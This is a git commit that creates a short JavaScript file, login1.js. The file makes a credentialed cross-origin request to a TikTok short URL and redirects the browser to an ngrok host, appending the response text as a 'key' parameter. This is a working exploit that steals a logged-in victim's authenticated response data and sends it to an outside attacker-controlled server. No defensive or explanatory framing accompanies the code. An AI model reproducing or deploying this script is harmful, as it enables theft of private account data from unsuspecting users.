c6ab834a6f15df1cfb20bd74ee04bb468485263e
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-01 00:09:14 +0700

    Create login1.js

---
+++ login1.js
@@ -0,0 +1,9 @@
+var xhr = new XMLHttpRequest();
+xhr.onload = reqListener; 
+xhr.open("GET", "https://www.tiktok.com/t/ZSLQjruAd/");
+xhr.withCredentials = true;
+xhr.send();
+
+function reqListener() {
+    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
+};
